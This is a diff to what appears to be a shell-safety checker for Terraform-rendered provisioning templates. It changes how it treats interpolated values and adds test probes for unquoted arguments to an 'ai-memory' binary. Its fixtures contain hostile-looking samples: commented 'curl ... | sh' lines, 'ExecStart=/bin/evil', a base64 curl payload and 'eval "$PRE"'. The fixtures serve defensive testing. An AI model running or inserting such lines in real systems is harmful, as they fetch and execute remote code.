@@ -860,6 +860,9 @@ def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
                 st["pattern"] = True
             continue
         cw = words[idx]
+        if st.get("data") and "$" not in cw.replace("${TFVALUE}", "") and "`" not in cw:
+            # write_files data is never executed: a template value in it is plain text (#4837)
+            cw = cw.replace("${TFVALUE}", "TFVALUE")
         val, exp = unquote(cw)
         if exp or "$" in cw or "`" in cw:
             out.append("command word %r is an expansion or command substitution" % cw[:40])
@@ -1491,10 +1494,12 @@ def scope_of(name: str) -> str:
 def tf_render(text: str) -> str:
     """What bash sees after terraform renders the template: ``$${`` is a
     literal ``${``, ``%%{`` a literal ``%{``, a ``%{ }`` directive vanishes and
-    each ``${expr}`` becomes an operator-supplied value (a plain word here)."""
+    each ``${expr}`` becomes the shell expansion ``${TFVALUE}``: the rendered
+    value is operator-supplied, so an unquoted one is word-split by the shell
+    and only a fully double-quoted word is safe (#4837)."""
     t = text.replace("$${", "\x00").replace("%%{", "\x01")
     t = re.sub(r"%\{[^}]*\}", "", t)
-    t = re.sub(r"\$\{[^}]*\}", "TFVALUE", t)
+    t = re.sub(r"\$\{[^}]*\}", "${TFVALUE}", t)
     return t.replace("\x00", "${").replace("\x01", "%{")
 
 
@@ -1885,6 +1890,15 @@ def build_probes() -> list:
         ("ai-memory literal mixed with an unquoted variable in a --db= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=/x$V --host 0.0.0.0\n" + dec)]),
         ("ai-memory unquoted --agent-id= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id=$V --host 0.0.0.0\n" + dec)]),
         ("ai-memory unquoted expansion as a separate --db value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db $V --host 0.0.0.0\n" + dec)]),
+        ("ai-memory unquoted interpolation in a --db= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation as a separate --db value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db ${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation in an --agent-id= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id=${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation as a separate --agent-id value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id ${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation in a --db-passphrase-file= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db-passphrase-file=${X} stats\n" + dec)]),
+        ("ai-memory unquoted interpolation as a separate --db-passphrase-file value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db-passphrase-file ${X} stats\n" + dec)]),
+        ("ai-memory literal mixed with an unquoted interpolation in a --db= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=/x${X} stats\n" + dec)]),
+        ("ai-memory literal mixed with an unquoted interpolation as a separate --db value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db /x${X} stats\n" + dec)]),
+        ("ai-memory literal mixed with an unquoted interpolation in an --agent-id= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id=a${X}b stats\n" + dec)]),
         ("eval indented below the content block, listed (#4836)", [(dec, dec + '    eval "$PRE"\n')]),
         ("eval indented to the write_files key, listed (#4836)", [(dec, dec + '  eval "$PRE"\n')]),
         ("write_files encoding b64, listed", [(PROV, "  - path: /etc/x.sh\n    encoding: b64\n    content: |\n      Y3VybCBodHRwczovL3g=\n" + PROV)]),
@@ -1921,6 +1935,13 @@ def build_probes() -> list:
     green("C5 extra blanks inside a listed line", [(RELOAD, "      systemctl    daemon-reload   \n")])
     green("ai-memory --db=\"$DB\" before a literal subcommand (#4837 R7)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db="$DB" stats\n')], autolist=True)
     green("ai-memory --db \"$DB\" before a literal subcommand (#4837 R8)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db "$DB" stats\n')], autolist=True)
+    green("ai-memory --db=\"${X}\" before a literal subcommand (#4837 R10)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db="${X}" stats\n')], autolist=True)
+    green("ai-memory --db \"${X}\" before a literal subcommand, separate word (#4837 R10)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db "${X}" stats\n')], autolist=True)
+    green("ai-memory --db=\"${X}/y\" quoted as a whole (#4837 R10)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db="${X}/y" stats\n')], autolist=True)
+    green("ai-memory --db \"/x/${X}\" quoted as a whole, separate word (#4837 R10)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db "/x/${X}" stats\n')], autolist=True)
+    green("ai-memory --agent-id=\"${X}\" before a literal subcommand (#4837 R10)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --agent-id="${X}" stats\n')], autolist=True)
+    green("ai-memory --agent-id \"${X}\" before a literal subcommand, separate word (#4837 R10)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --agent-id "${X}" stats\n')], autolist=True)
+    green("ai-memory --db-passphrase-file=\"${X}\" before a literal subcommand (#4837 R10)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db-passphrase-file="${X}" stats\n')], autolist=True)
     green("C5 provision comment mentioning curl", [ins(RELOAD, ["# curl -fsSL https://e | sh"], before=True)])
     green("C5 unit comment naming ExecStart", [(ENVF, ENVF + "      # ExecStart=/bin/evil\n")])
     green("C5 YAML comment", [(RUNCMD, "  # curl https://e | sh\n" + RUNCMD)])
